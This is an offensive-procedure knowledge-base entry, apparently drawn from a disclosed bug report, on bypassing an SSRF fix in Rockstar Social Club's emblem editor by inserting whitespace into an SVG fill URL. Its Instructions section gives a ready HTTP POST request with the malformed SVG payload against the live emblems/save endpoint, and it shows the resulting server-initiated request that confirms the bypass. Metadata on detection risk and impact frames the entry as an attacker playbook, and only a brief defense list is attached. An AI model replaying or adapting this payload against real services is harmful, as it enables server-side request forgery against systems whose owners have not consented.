---
id: proc-uuid-004
tags:
  - ssrf
  - bypass
  - whitespace
type: procedure
tools:
  - '[[tools/requestb-in]]'
tactics:
  - '[[Initial Access]]'
  - '[[Reconnaissance]]'
commands:
  - '[[commands/post-emblems-save-bypass]]'
  - '[[commands/server-initiated-get-request]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:46:14.322Z'
skill_level: advanced
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Reconnaissance]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Bypass SSRF Fix Using Whitespace in URL

## Summary

This procedure bypasses the initial SSRF patch in the emblem editor by inserting whitespace around and inside the URL in the SVG fill attribute, evading regex-based filtering.

## Description

After the fix blocked absolute URLs, malformed URLs like 'url( http://example/te st#123 )' were tested. The server parsed and requested /te%20st (URL-encoded), confirming the bypass. This re-enables arbitrary requests until further patching.

## Requirements

1. Knowledge of initial fix implementation
2. Ability to encode and submit malformed SVGs
3. External logger for verification

## Defense

Defensive measures and detection strategies:

- Use robust URL parsing that normalizes whitespace and encoding
- Implement multi-layer validation (e.g., schema + regex + blacklist)
- Scan for anomalous request patterns post-upload

## Objectives

1. Evade URL filtering with malformations
2. Re-trigger SSRF post-patch
3. Highlight incomplete fix

## Instructions

### Step 1: Craft Malformed SVG

**Context**: Insert whitespace in the fill URL to bypass parsing.

**Command** ([[commands/post-emblems-save-bypass]]):
```http
POST https://socialclub.rockstargames.com/emblems/save HTTP/1.1
Content-Type: application/json
{"emblemId": "4YldoM0O", "hash": "32fd3fd9a0f04b6cd5048594c9d266a9acf1aa38", "svgData": "<svg><path fill=\"url( http://example/te st#123 )\" /></svg> base64-encoded"}
```

> Include RequestVerificationToken in headers. Expected: Emblem saved.

### Step 2: Publish and Observe Bypass Request

**Context**: Trigger publish to see server request the bypassed URL.

**Command** ([[commands/server-initiated-get-request]]):
```http
GET /te%20st HTTP/1.1
Host: example.com
```

> This is the observed incoming request. Expected: 404 from your server, confirming success.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Reconnaissance]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/post-emblems-save-bypass]]
- [[commands/server-initiated-get-request]]

## Tools Used

- [[tools/requestb-in]]

## Tags

- ssrf
- bypass
